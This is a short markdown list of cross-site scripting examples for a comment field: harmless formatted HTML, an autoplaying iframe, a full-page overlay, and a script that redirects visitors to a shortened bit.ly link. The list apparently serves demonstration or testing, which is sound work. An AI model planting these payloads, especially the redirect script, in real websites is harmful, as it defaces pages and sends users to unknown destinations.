### XSS Examples:

**Well formatted comment**

```
<h1>Well formatted comment</h1>
<p>Lorem ipsum<p>
<p>Lorem ipsum<p>
```

**Comment with an iframe**

```
<iframe width="925" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0&amp;autoplay=1&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
```

**Dark souls style comment**

```
<div style="width:100%;height:100%;position: absolute;top: 0;left:0;background-color: black;color: red;text-align: center;padding: 20%;">
<h1>You died</h1>
</div>
```

**Comment with redirect**

```
<script>
window.location.replace('https://bit.ly/3MRMLyq');
</script>
```